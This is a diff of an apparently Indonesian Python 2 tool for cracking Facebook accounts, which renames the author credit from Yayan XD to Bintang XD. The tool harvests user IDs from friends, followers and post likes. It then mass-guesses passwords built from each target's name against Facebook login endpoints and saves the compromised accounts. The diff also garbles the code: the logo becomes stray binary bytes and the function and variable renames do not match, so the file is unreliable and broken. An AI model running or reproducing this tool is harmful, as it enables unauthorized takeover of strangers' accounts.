@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Yayan XD
+# code by Bintang XD
 # my facebook ( https://www.facebook.com/KM39453 )
 
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Yayan XD.
+#      Coded By Bintang XD.
 
 import os
 try:
@@ -88,10 +88,7 @@ def tod():
         time.sleep(1)
 
 # LO KONTOL
-logo = ''' \033[0;96m __  __        __  ______  ____
- \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
- \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
- \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
+_______  _______  _______  _______ _________          _______sF\x00\x00\x00\x1b[1;91m(  ____ )(  ____ )(  ____ \\(       )\\__   __/|\\     /|(       )sF\x00\x00\x00\x1b[1;91m| (    )|| (    )|| (    \\/| () () |   ) (   | )   ( || () () |sF\x00\x00\x00\x1b[1;91m| (____)|| (____)|| (__    | || || |   | |   | |   | || || || |sF\x00\x00\x00\x1b[1;97m|  _____)|     __)|  __)   | |(_)| |   | |   | |   | || |(_)| |sF\x00\x00\x00\x1b[1;97m| (      | (\\ (   | (      | |   | |   | |   | |   | || |   | |sF\x00\x00\x00\x1b[1;97m| )      | ) \\ \\__| (____/\\| )   ( |___) (___| (___) || )   ( |sF\x00\x00\x00\x1b[1;97m|/       |/   \\__/(_______/|/     \\|\\_______/(_______)|/     \\  \033[0m|| Facebook.com/KM39453''' By Bintang XD
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -128,7 +125,7 @@ def yayanxd():
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
 
 ### ORANG GANTENG ###
-def moch_yayan():
+def moch_Bintang():
     os.system('clear')
     try:
     	kontol = open('.memek.txt', 'r').read()
@@ -142,24 +139,24 @@ def moch_yayan():
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
     os.system('clear')
     print logo
-    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
+    IP = requests.get('https://www.bintangxd.my.id/server/ip/').text
     print '___________________________________________________________\n';time.sleep(0.03)
     print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
     print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
     print '___________________________________________________________\n';time.sleep(0.03)
-    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
-    print ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
-    print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
-    print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
-    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
-    print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
-    print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
-    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
-    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
-    print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
+    print ' [%s01%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
+    print ' [%s02%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
+    print ' [%s03%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
+    print ' [%s04%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
+    print ' [%s05%s]. Memulai crack'%(O,N);time.sleep(0.03)
+    print ' [%s06%s]. Cari ingformasi akun fb'%(O,N);time.sleep(0.03)
+    print ' [%s07%s]. Cek hasil crack'%(O,N);time.sleep(0.03)
+    print ' [%s08%s]. Ganti user agent'%(O,N);time.sleep(0.03)
+    print ' [%s09%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
+    print ' [%s00%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [*] menu : ')
     if pepek == '':
-        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_bintang()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -175,7 +172,7 @@ def moch_yayan():
     elif pepek in['7','07']:
         try:
             dirs = os.listdir("results")
-            print '\n [ hasil crack yang tersimpan di file anda ]\n'
+            print '\n [ hasil crack tersimpan di file anda ]\n'
             for file in dirs:
                 print(" [%s+%s] %s"%(O,N,file))
             file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
@@ -192,10 +189,10 @@ def moch_yayan():
                 titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_bintang()
         except (IOError):
             print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_bintang()
     elif pepek in['8','08']:
         seting_yntkts()
     elif pepek in['9','09']:
@@ -253,7 +250,7 @@ def teman(kontol):
     except (KeyError,IOError):
         os.remove(cin)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_bintang()
 '''
 																																																				csy = 'Cindy sayang Yayan'
 																																																				ysc = 'Yayan sayang Cindy'
@@ -310,11 +307,11 @@ def followers(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));moch_bintang()
     except (KeyError,IOError):
         os.remove(ah)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_bintang()
 
 # dump id dari followers hehe
 def followers(kontol):
@@ -368,11 +365,11 @@ def postingan(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        raw_input(' [%s ENTER%s ] '%(O,N));moch_Bintang()
     except (KeyError,IOError):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
-        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_bintang()
 
 # cek ingfo
 def cek_ingfo(kontol):
@@ -575,7 +572,7 @@ class __crack__:
         except:
             print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        ___bintangganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
@@ -611,7 +608,7 @@ class __crack__:
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
-                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
+                                        __bintangXD__.submit(self.__mbasic__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -620,11 +617,11 @@ class __crack__:
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with YayanGanteng(max_workers=30) as (__BintangXD__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
-                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
+                                        __bintangXD__.submit(self.__mfb,__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -753,7 +750,7 @@ class __crack__:
 
         loop += 1
 
-    def __mfb__(self, user, __yan__):
+    def __mfb__(self, user, __bin__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
@@ -812,7 +809,7 @@ class __crack__:
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
+            with BintangGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = yntkts.split('<=>')
@@ -821,7 +818,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__api__, uid, pwx)
+                        __BintangXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
 
@@ -871,4 +868,4 @@ class __crack__:
 
 if __name__ == '__main__':
     os.system('git pull')
-    moch_yayan()
+    moch_bintang()
